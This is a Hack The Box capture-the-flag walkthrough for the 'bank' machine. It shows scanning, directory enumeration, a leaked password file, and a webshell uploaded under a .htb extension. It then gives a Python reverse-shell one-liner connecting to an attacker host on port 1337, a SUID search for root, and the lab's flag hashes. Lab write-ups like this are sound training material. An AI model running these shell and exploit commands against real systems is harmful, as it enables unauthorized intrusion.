---
layout: post
title: bank Walkthrough
subtitle: Hack The Box Bank Solution
tags: [bank, hackthebox, htb, walkthrough, pentest, CTF]
comments: true
---

We are going to do a penetration test of a nice machine from hackthebox.eu called bank. I made it in company of my work mate [last](http://blog.notso.pro "last") in about 5 hours. This machine hasn't been so hard, but we had few problems to understand how to unlock the way to cross.
The only information we received were the name of the machine
````
bank
````
and the ip address
```
10.10.10.29 
```

so we scanned it using nmap

~~~
root@kali:~# nmap -sV -p- -n 10.10.10.29
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-26 14:25 CEST
Nmap scan report for 10.10.10.29
Host is up (0.036s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.26 seconds
~~~

we can notice we found 3 services to check.

- OpenSSH 6.6.1p1
- ISC BIND 9.9.5-3ubuntu0.14
- Apache httpd 2.4.7

but there weren't known vulnerabilities for them.

So We tried to connect on the 80 port for checking the web server, but we didn't get interesting things.
The response was the default page of Apache, and there weren't hidden surprises in the source code.
We continued the PT enumerating the hidden directories using **dirbuster** but nothing happened.


We wasted many time trying to find the right way, 
using some big wordlist for the directories webserver enumeration, connecting to the 53 port, scanning UDP port of the machine but we didn't get any result.
After few hours spent wasting time, we had an idea.
Maybe the server was configured with virtualhost, so using the right domain we would be able to connect to the web application.

so we edited our hosts file
~~~
root@kali:/# nano etc/hosts
~~~

adding this line
~~~
10.10.10.29	bank.htb
~~~

so going by browser on `bank.htb` TADA'!!!
we found the login panel of the web application.
SQL injection didn't work, so we tried again to enumerate the directories.

## ENUMERATION
I launched my dear friends **dirsearch**

~~~
root@kali:~/dirsearch# python3 dirsearch.py -u bank.htb -e * -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
~~~
let me analyze the command:
- **-u bank.htb** for specifying the Host
- **-e \*** for the extentions (we set ALL) 
- **-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt** for the wordlist, i preferred to use the biggest wordlist for being sure

That's the result

~~~
[15:06:44] Starting: 
[15:06:44] 301 -  305B  - /uploads  ->  http://bank.htb/uploads/
[15:06:45] 301 -  304B  - /assets  ->  http://bank.htb/assets/
[15:06:48] 302 -    7KB - /  ->  login.php
[15:06:52] 301 -  301B  - /inc  ->  http://bank.htb/inc/
[15:12:19] 403 -  288B  - /server-status
[15:18:06] 301 -  314B  - /balance-transfer  ->  http://bank.htb/balance-transfer/

Task Completed
~~~

Our attenction was on

~~~
[15:18:06] 301 -  314B  - /balance-transfer  ->  http://bank.htb/balance-transfer/
~~~

in this directory there was an huge list of crypted .acc (account) files.

They were so similar, so **last** said me to check the size, We found one smaller then the others.

![found-not-encrypted](https://mrsaighnal.github.io/img/posts/2019-04-26-bank-walkthrough/found-not-encrypted.png "found-not-encrypted")

One file wasn't crypted and the informations were readable.

~~~
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
~~~

We were able to log in the platform, watching the balance, transaction history etc etc.
The vulnerability was inside the support page, there was an upload module, but we didn't find a way for uploading malware right there.


![found-not-encrypted](https://mrsaighnal.github.io/img/posts/2019-04-26-bank-walkthrough/support-page.png "support-page")

### EXPLOITATION

Reading more deeply we discovered the developer missed an important information used for debugging inside the HTML source code.

~~~
<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
~~~


**thanks Mr Dev!** We can now upload our fantastic square-webshell (you should look at it on the [official repository](https://github.com/MrSaighnal/square-webshell "official repo")) simply changing the extension to .htb .

exploring the file system we found the first flag

~~~
cat ../../../../home/chris/user.txt
~~~

user.txt output:
~~~
37c97f8609f361848d8872098b0721c3
~~~

![found-not-encrypted](https://mrsaighnal.github.io/img/posts/2019-04-26-bank-walkthrough/square-webshell.png "user owned")

{: .box-success}
**Success:** User Owned.

it's now time to spawn real shell for managing our new system :-)

let's get ready our computer for receving connections through **nc** using the command

~~~
root@kali:~# nc -vv -n -l -p 1337
~~~
Our machine is now listening on the 1337 port. (Don't close this terminal!!!)

let's launch on the webshell this command

~~~
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.2",1337));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
~~~

be sure to edit the 3°raw with your parameters **YOUR_IP** and **PORT**.

come back on your **nc** terminal and you shold see something similar to:

~~~
root@kali:~# nc -vv -n -l -p 1337
listening on [any] 1337 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.29] 51390
/bin/sh: 0: can't access tty; job control turned off
$
~~~

let's try to launch a command

~~~
root@kali:~# nc -vv -n -l -p 1337
listening on [any] 1337 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.29] 51390
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
~~~
it works.

### PRIVILEDGE ESCALATION

for priviledge escalation we launched a command for checking all files with high priviledge 

~~~
$ find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2> /dev/null
~~~

and the first apperd so weird:

~~~
-rwsr-xr-x 1 root root 112204 Jun 14  2017 `/var/htb/bin/emergency`
~~~

Our friend sysadmin misconfigurated the system leaving an important vulnerability open, through this file anybody is able to become root.

~~~
cd /var/htb/bin/
ls
emergency
./emergency
whoami
root
~~~

![found-not-encrypted](https://mrsaighnal.github.io/img/posts/2019-04-26-bank-walkthrough/whoami-root.png "whoami root")

and get the root flag 

~~~
cat /root/root.txt  
d5be56adc67b488f81a4b9de30c8a68e
~~~


![found-not-encrypted](https://mrsaighnal.github.io/img/posts/2019-04-26-bank-walkthrough/root-flag.png "root owned")

{: .box-success}
**Success:** Root Owned.
